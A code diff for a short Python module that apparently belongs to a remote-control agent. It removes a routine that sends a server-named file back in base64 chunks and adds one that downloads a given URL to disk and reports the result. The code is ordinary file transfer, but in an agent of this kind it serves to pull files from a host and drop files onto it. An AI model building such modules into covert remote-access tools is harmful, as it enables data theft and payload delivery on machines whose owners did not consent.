@@ -1,21 +1,13 @@
-import os
-import base64
+import requests
 
-import server
-
-
-FRAG_SIZE = 10000000
+import utils
 
 
-def run():
-    filepath = server.hello()
-    if os.path.exists(filepath):
-        fd = open(filepath, 'rb')
-        while True:
-            chunk = fd.read(FRAG_SIZE)
-            if not chunk:
-                break
-            file_data = base64.b64encode(chunk)
-            server.tell(file_data)
-        fd.close()
-        server.tell("END_OF_FILE")
+def run(url):
+    filename = url.split('/')[-1]
+    r = requests.get(url, stream=True)
+    with open(filename, 'wb') as f:
+        for chunk in r.iter_content(chunk_size=8000):
+            if chunk:
+                f.write(chunk)
+    utils.send_output("Downloaded: %s -> %s" % (url, filename))
